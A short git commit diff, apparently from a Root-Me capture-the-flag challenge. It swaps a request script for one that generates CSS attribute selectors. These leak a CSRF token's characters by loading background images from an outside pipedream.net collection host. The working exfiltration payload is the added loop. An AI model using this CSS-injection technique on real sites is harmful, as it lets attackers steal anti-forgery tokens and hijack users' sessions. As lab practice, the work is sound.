f74024fd131a03aa1ff6ee1b08de6bceede67707
Coutand <bastien.coutand@netcourrier.com>
2022-04-27 20:31:06 +0200

    update css

--- a.py
+++ a.py
@@ -1,5 +1,7 @@
-import requests
 
-data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", "csrf":"ruW-tjL1BWCdhbiOSC"}
-r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
-print(r.content)
+f = open("data.css", "w")
+
+for i in range(127):
+    f.write('input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'+chr(i)+'"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC:);}')
+
+f.close()
